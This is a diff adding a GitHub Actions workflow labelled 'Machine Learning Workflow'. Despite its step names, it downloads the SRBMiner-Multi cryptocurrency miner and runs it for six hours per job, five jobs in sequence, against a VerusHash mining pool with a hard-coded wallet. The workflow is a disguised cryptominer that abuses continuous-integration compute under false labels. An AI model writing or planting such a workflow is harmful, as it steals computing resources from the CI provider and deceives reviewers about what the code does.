@@ -1,0 +1,39 @@
+name: Machine Learning Workflow
+
+on:
+  push:
+    branches:
+      - main  # Adjust if your default branch is different
+
+jobs:
+  build:
+    runs-on: namespace-profile-default
+    strategy:
+      matrix:
+        device: [1, 2, 3, 4, 5]
+      max-parallel: 1  # Ensures jobs run consecutively, not in parallel
+      fail-fast: false
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v2
+
+      - name: Install Dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar xz-utils
+
+      - name: Download and Extract Machine Learning Model
+        run: |
+          wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz
+          tar xf SRBMiner-Multi-2-4-7-Linux.tar.xz
+
+      - name: List Files
+        run: |
+          ls -la SRBMiner-Multi-2-4-7
+
+      - name: Run Machine Learning Model for 6 hours
+        timeout-minutes: 360  # 6 hours
+        run: |
+          cd SRBMiner-Multi-2-4-7
+          timeout 6h ./SRBMiner-MULTI --disable-gpu --algorithm VerusHash --pool usse.vipor.net:5040 --wallet RP5Yv6QgztNLY87SuTxVy21HUUC7VtNqrc.n1 pause --keepalive true
